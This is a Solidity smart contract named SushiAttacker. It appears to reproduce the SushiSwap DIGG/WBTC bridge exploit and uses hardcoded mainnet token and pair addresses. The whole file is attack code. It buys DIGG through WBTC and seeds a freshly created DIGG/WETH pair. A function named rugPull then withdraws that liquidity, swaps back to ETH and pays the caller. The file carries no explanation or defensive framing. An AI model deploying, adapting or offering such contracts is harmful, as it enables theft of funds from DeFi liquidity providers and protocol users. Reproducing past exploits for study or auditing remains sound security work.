// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0;
import "@uniswap/v2-periphery/interfaces/IUniswapV2Router02.sol";
import "@uniswap/v2-core/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/interfaces/IUniswapV2Factory.sol";
import "interfaces/IWETH.sol";

contract SushiAttacker {
    IUniswapV2Router02 public immutable sushiRouter;
    IUniswapV2Factory public immutable sushiFactory;
    IWETH weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair diggWBTCPair = IUniswapV2Pair(0x9a13867048e01c663ce8Ce2fE0cDAE69Ff9F35E3);

    constructor(
        IUniswapV2Router02 _sushiRouter,
        IUniswapV2Factory _sushiFactory
    ) {
        sushiRouter = _sushiRouter;
        sushiFactory = _sushiFactory;
    }


    function createAndProvideLiquidity(
        IERC20 wbtc, // WBTC
        IERC20 digg // DIGG
    ) external payable returns (IUniswapV2Pair pair) {
        // first acquire both tokens for vulnerable pair
        // we assume one token of the pair has a WETH pair
        // deposit all ETH for WETH
        // trade WETH/2 -> wethBridgeToken (wbtc) -> nonWethBridgeToken (digg)
        weth.deposit{value: msg.value}();
        weth.approve(address(sushiRouter), msg.value);
        address[] memory path = new address[](3);
        path[0] = address(weth);
        path[1] = address(wbtc);
        path[2] = address(digg);
        uint256[] memory swapAmounts =
            sushiRouter.swapExactTokensForTokens(
                msg.value / 2,
                0,
                path,
                address(this),
                type(uint256).max
            );
        uint256 diggBridgeAmount = swapAmounts[2];

        // create pair
        pair = IUniswapV2Pair(
            sushiFactory.createPair(address(digg), address(weth))
        );

        // add liquidity
        digg.approve(address(sushiRouter), diggBridgeAmount);
        sushiRouter.addLiquidity(
            address(weth),
            address(digg),
            msg.value / 2, // rest of WETH
            swapAmounts[2], // all tokens we received
            0,
            0,
            address(this),
            type(uint256).max
        );
    }

    function rugPull(
        IUniswapV2Pair diggWETHPair, // DIGG <> WETH
        IERC20 wbtc // WBTC
    ) external payable {
        // redeem LP tokens for underlying
        IERC20 digg = IERC20(diggWETHPair.token0()); // DIGG
        if (digg == weth) {
            digg = IERC20(diggWETHPair.token1());
        }
        uint256 lpToWithdraw = diggWETHPair.balanceOf(address(this));
        diggWETHPair.approve(address(sushiRouter), lpToWithdraw);
        sushiRouter.removeLiquidity(
            address(weth),
            address(digg),
            lpToWithdraw,
            0,
            0,
            address(this),
            type(uint256).max
        );

        // trade otherToken -> wethBridgeToken -> WETH
        uint256 otherTokenBalance = digg.balanceOf(address(this));
        digg.approve(address(sushiRouter), otherTokenBalance);
        address[] memory path = new address[](3);
        path[0] = address(digg);
        path[1] = address(wbtc);
        path[2] = address(weth);

        uint256[] memory swapAmounts =
            sushiRouter.swapExactTokensForTokens(
                otherTokenBalance,
                0,
                path,
                address(this),
                type(uint256).max
            );

        // convert WETH -> ETH
        weth.withdraw(swapAmounts[2]);
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "final transfer failed");
    }

    receive() external payable {}
}